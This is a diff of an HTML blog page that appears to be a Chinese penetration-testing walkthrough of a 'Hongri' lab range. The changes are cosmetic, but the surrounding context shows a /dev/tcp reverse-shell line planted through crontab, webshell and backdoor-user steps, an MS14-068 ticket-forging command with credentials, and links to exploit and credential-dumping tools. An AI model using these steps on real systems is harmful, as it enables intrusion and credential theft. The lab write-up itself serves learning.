@@ -50,7 +50,7 @@
 <meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105155217-67ovbij.png">
 <meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105160029-nk9vhxe.png">
 <meta property="article:published_time" content="2024-01-05T09:57:48.000Z">
-<meta property="article:modified_time" content="2024-01-05T13:55:32.149Z">
+<meta property="article:modified_time" content="2024-01-05T14:00:10.301Z">
 <meta property="article:author" content="清风">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105163649-sck4l3o.png">
@@ -178,7 +178,7 @@
       
         <time datetime="2024-01-05T09:57:48.000Z" class="dt-published" itemprop="datePublished">2024-01-05</time>
         
-        (Updated: <time datetime="2024-01-05T13:55:32.149Z" class="dt-updated" itemprop="dateModified">2024-01-05</time>)
+        (Updated: <time datetime="2024-01-05T14:00:10.301Z" class="dt-updated" itemprop="dateModified">2024-01-05</time>)
         
       
     </div>
@@ -221,7 +221,7 @@ Kali：
 <pre><code>docker start ec 17 09 bb da 3d ab ad
 </code></pre>
 <p>拓扑如下：</p>
-<p>​​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105175525-810lj0p.png" alt="image">​​​</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105175525-810lj0p.png" alt="image">​​​</p>
 <h2 id="打点×3"><a href="#打点×3" class="headerlink" title="打点×3"></a>打点×3</h2><p>拿fscan都能扫出来，然后拿工具直接打就行了</p>
 <p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102095640-rt6w6c5.png" alt="image">​</p>
 <h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>这个就利用最简单的写木马即可了</p>
@@ -264,7 +264,7 @@ echo "/bin/bash -i >&amp; bash -i >&amp; /dev/tcp/192.168.120.1/9090 0>&amp;1"  
 
 cat /qingfeng/etc/crontab
 </code></pre>
-<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102151756-ih6j9uz.png" alt="image">​​</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102151756-ih6j9uz.png" alt="image">​​</p>
 <p>之后监听9090等两分钟即可吃到shell</p>
 <p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102124935-z9hgc26.png" alt="image">​</p>
 <h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>首先就是直接上fscan开扫了,先看一下网段</p>
@@ -314,7 +314,7 @@ set rhosts 192.168.183.133 # 设置win7的ip地址为目标地址
 </code></pre>
 <p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105144950-1vhrc93.png" alt="image">​</p>
 <p>配置好直接run即可：</p>
-<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105150723-ft632d7.png" alt="image">​​</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105150723-ft632d7.png" alt="image">​​</p>
 <p>所以下一步的目标就是攻破域控了</p>
 <h3 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h3><p>为了方便我这里直接添加用户上桌面了：</p>
 <pre class=" language-shell"><code class="language-shell">net user qingfeng qwer1234! /add
@@ -357,10 +357,11 @@ SID               : S-1-5-21-979886063-1111900045-1414766810-1107
 </code></pre>
 <p>这里抓到了用户的SID，可以尝试使用MS14-068打一下了，如果域控没装KB3011780的话就可以拿下</p>
 <hr>
-<p>可能用得到的工具下载地址：</p>
-<p>Ms14-068.exe 下载地址:<a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
-<p>PSexec 下载地址:<a target="_blank" rel="noopener" href="https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe">https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</a></p>
-<p>mimikatz 下载地址:<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+<p>需要用到的工具下载地址：</p>
+<pre class=" language-xml"><code class="language-xml">Ms14-068.exe 下载地址:https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068
+PSexec 下载地址:https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe
+mimikatz 下载地址:https://github.com/gentilkiwi/mimikatz/releases
+</code></pre>
 <hr>
 <p>首先需要生成票据：</p>
 <pre class=" language-xml"><code class="language-xml">MS14-068.exe -u douser@DEMO.COM -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130
